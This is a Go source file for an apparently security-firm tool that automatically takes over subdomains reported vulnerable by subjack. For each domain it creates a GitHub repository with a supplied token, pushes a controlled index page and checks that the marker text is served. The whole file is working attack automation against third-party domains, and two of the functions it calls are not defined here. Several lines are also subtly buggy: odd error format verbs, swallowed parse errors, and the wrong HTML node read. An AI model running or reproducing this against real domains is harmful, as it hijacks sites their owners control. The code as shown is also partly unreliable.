package autotakeover

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/fopina/subjack/subjack"
	"golang.org/x/net/html"
)

var (
	// baseUrl is var instead of const so tests can override this value for a test server with mocked responses.
	// This base value is for GitHub API.
	baseUrl     string = "https://api.github.com/"
	githubToken string
)

// Takeover is the single public function of the
func Takeover(inputList, token string) {
	if _, err := os.Stat(inputList); err != nil {
		log.Printf("failed to load input file - might not exist: %e\n", err)
		return
	}

	// Package-level variable assignment
	githubToken = token
	var (
		domains []string
		err     error
	)

	isJsonInput := strings.HasSuffix(inputList, ".json")
	if isJsonInput {
		domains, err = parseJson(inputList)
	} else {
		domains, err = parseText(inputList)
	}

	if err != nil {
		log.Printf("failed reading files from input list %s: %e\n exitting\n", inputList, err)
		return
	}

	// domains wll be a slice of strings containing vulnerable subdomains
	for _, domain := range domains {
		success, link, err := processDomain(domain)
		if err != nil {
			log.Printf("failed taking over subdomain %s: %s\n", domain, err)
			continue
		}

		if success {
			log.Printf("takeover of %s successful. repo at %s", domain, link)
		}
	}

}

func parseJson(input string) ([]string, error) {
	var results []string
	f, err := os.OpenFile(input, os.O_RDONLY, 0600)
	if err != nil {
		return []string{}, nil
	}
	defer f.Close()

	bs, _ := io.ReadAll(f)
	var tmpRes []subjack.Results
	if err := json.Unmarshal(bs, &tmpRes); err != nil {
		return []string{}, nil
	}

	// only get vulnerable ones
	for _, result := range tmpRes {
		if result.Vulnerable {
			results = append(results, result.Subdomain)
		}
	}

	return results, nil
}

func parseText(input string) ([]string, error) {
	var vulnDomains []string
	f, err := os.OpenFile(input, os.O_RDONLY, 0600)
	if err != nil {
		return []string{}, err
	}
	defer f.Close()

	reader := bufio.NewScanner(f)
	reader.Split(bufio.ScanLines)

	for reader.Scan() {
		// only care for actually vulnerable domains
		line := reader.Text()
		if strings.Contains(strings.ToLower(line), "not vulnerable") {
			continue
		}
		vulnDomains = append(vulnDomains, reader.Text())
	}

	return vulnDomains, nil
}

func processDomain(domain string) (bool, string, error) {
	// Create Repo on GitHub using token
	success, repo, err := createRepository(domain)
	if err != nil {
		log.Printf("failed creating repository: %e", err)
		return success, "", err
	}

	// Set index.html page with dummy/controlled data
	success, err = createIndexFile(repo)
	if err != nil {
		log.Printf("failed pushing fake file to repository: %e", err)
		return success, "", err
	}

	// Request to vulnerable endpoint to validate dummy/controlled data is displayed
	takenover, err := checkPageContent(domain)
	if err != nil {
		return success, repo, fmt.Errorf("failed validating wether %s was takenover: %s\n", domain, err)
	}

	if takenover {
		return takenover, repo, nil
	}

	return success, repo, nil
}

func checkPageContent(domain string) (bool, error) {
	resp, err := http.Get(domain)
	if err != nil {
		return false, fmt.Errorf("failed sending GET request to %s: %e", domain, err)
	}
	defer resp.Body.Close()

	htmlDoc, err := html.Parse(resp.Body)
	if err != nil {
		return false, fmt.Errorf("failed parsing html response from %s: %e", domain, err)
	}

	var contentSeeker func(*html.Node)
	var actual string
	contentSeeker = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "h1" {
			actual = strings.ToLower(n.NextSibling.Data)
			return
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			contentSeeker(c)
		}
	}
	contentSeeker(htmlDoc)

	if strings.Contains(actual, "taken over by surface security") {
		return true, nil
	} else {
		return false, nil
	}
}
